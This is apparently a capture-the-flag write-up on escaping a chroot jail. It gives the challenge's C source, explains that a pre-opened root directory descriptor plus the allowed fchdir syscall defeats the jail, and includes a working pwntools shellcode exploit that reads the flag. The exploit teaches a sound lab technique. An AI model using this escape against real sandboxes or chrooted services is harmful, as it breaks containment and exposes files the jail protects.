---
title: "Chroot Escape via fchdir"
description: "Using the fchdir syscall on a pre-opened directory descriptor to move the process's current working directory outside of the chroot jail."
date: "2025-12-30"
order: 6
draft: false
---

# Chroot Escape via fchdir

## Challenge Source Code

```c
#include <assert.h>
#include <fcntl.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/sendfile.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#include <seccomp.h>

int main(int argc, char **argv, char **envp) {
  assert(argc > 0);

  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stdout, NULL, _IONBF, 1);

  assert(argc > 1);

  // Checking to make sure you're not trying to open the flag.
  assert(strstr(argv[1], "flag") == NULL);

  int fd = open(argv[1], O_RDONLY | O_NOFOLLOW);

  char jail_path[] = "/tmp/jail-XXXXXX";
  assert(mkdtemp(jail_path) != NULL);

  assert(chroot(jail_path) == 0);

  assert(chdir("/") == 0);

  int fffd = open("/flag", O_WRONLY | O_CREAT);
  write(fffd, "try harder", 10);
  close(fffd);

  void *shellcode =
      mmap((void *)0x1337000, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC,
           MAP_PRIVATE | MAP_ANON, 0, 0);
  assert(shellcode == (void *)0x1337000);

  int shellcode_size = read(0, shellcode, 0x1000);

  scmp_filter_ctx ctx;

  ctx = seccomp_init(SCMP_ACT_KILL);
  assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(fchdir), 0) == 0);
  assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0) == 0);
  assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0) == 0);
  assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0) == 0);
  assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(sendfile), 0) == 0);

  assert(seccomp_load(ctx) == 0);

  ((void (*)())shellcode)();
}
```

## Vulnerability Analysis

The challenge allows the `fchdir` system call, which is a powerful primitive for escaping jails when combined with a leaked file descriptor.

```c
assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(fchdir), 0) == 0);
```

The `fchdir` syscall changes the process's current working directory to the directory referenced by a file descriptor. If we possess a file descriptor pointing to a directory **outside** the jail (e.g., the host's root), calling `fchdir` on it will move our CWD out of the jail.

## Exploitation Plan

1. **Leak Root FD:** Execute the binary with `/` as the argument to obtain a file descriptor (FD 3) pointing to the host's root directory.
2. **Escape Jail:** Use the `fchdir` syscall with the leaked FD (3). This sets our current working directory to the host's root.
3. **Read Flag:** Now that our CWD is the host's root, we can simply `open("flag")` (relative to CWD) to access the real flag.

## Exploit Script

The following Python script uses `pwntools` and `shellcraft` to generate the assembly for our escape. We leverage `fchdir` on the leaked root file descriptor (FD 3) to move our current working directory out of the jail before reading the flag.

```python
from pwn import *

elf = context.binary = ELF("./challenge")

# Pass '/' to leak the root FD
p = process([elf.path, "/"])

# Refactored to shellcraft
# 1. fchdir(3) - Change directory to the leaked root FD
sc = shellcraft.fchdir(3)

# 2. open("flag", O_RDONLY) - Open the flag file (relative to new CWD)
sc += shellcraft.open("flag", constants.O_RDONLY)

# 3. sendfile(1, fd, 0, 100) - Send file content to stdout
sc += shellcraft.sendfile(1, 'rax', 0, 100)

# 4. exit(0)
sc += shellcraft.exit(0)

p.send(asm(sc))
print(p.recvall().decode())
p.close()
```
